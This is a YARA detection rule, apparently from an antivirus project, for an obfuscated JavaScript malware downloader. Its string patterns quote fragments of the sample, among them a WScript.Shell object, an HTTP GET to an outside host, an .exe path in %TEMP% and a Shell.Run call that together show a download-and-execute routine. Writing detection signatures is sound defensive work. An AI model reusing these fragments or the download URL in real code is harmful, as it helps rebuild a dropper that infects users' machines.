rule sig_20160328_cf69d11ccf0dd44019cde2bd43474e82 {
  meta:
    description = "datamaliciousorder - file 20160328_cf69d11ccf0dd44019cde2bd43474e82.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9414de5b88ceeb835e2a21ae3d78c4285af5580acae74272852b380e82cd3f79"

  strings:
    $s1  = "function Snqramx() {return Yzujo[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"jZ9wFEm1rnoz8.exe\";};" fullword ascii
    $s2  = "do {WScript[Agzxylrpt](Peauq() * 11)} while (Zbdmznjdt[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Qfjdpsc(Szlkifaxzr, Kwdatbp){return Szlkifaxzr - Kwdatbp;};" fullword ascii
    $s4  = "var Yzujo = function Grjpmp() {return WScript[Kgepej](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Zbdmznjdt[Rwrqlqxj](\"GET\", \"http://www.stopeugenicsnow.eu/m8dhs\", false);" fullword ascii
    $s6  = "function Gogdn() {return ((Gbvrged == true) && (Gbvrged == Sbwhd)) ? 1 : Cbdred;};" fullword ascii
    $s7  = "function Pfnsomk(Mfompbpqp){Yzujo[\"Run\"](Mfompbpqp, Cbdred, Cbdred);};" fullword ascii
    $s8  = "function Uzkwjmjm(){return Kgepej;};" fullword ascii
    $s9  = "var Gbvrged = false;" fullword ascii
    $s10 = "function Tnlnbnazqd(){return Okdrcbu;};" fullword ascii
    $s11 = "var Ceuosodfvk = false;" fullword ascii
    $s12 = "return Qfjdpsc(Iowttrvy, Insrt);" fullword ascii
    $s13 = "Gbvrged = true; " fullword ascii
    $s14 = "function Ewfxmr()" fullword ascii
    $s15 = "Sbwhd = true; " fullword ascii
    $s16 = "function Peauq(){return 22;};" fullword ascii
    $s17 = " while (Pkwcfvfpjk){" fullword ascii
    $s18 = "var Hjxdw = new this[\"Date\"]();" fullword ascii
    $s19 = "function Cdkzopwgpf(Zahbztvo) {var Ozobjjpmf = (1, 2, 3, 4, 5, Zahbztvo); return Ozobjjpmf;};" fullword ascii
    $s20 = "var Sbwhd = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}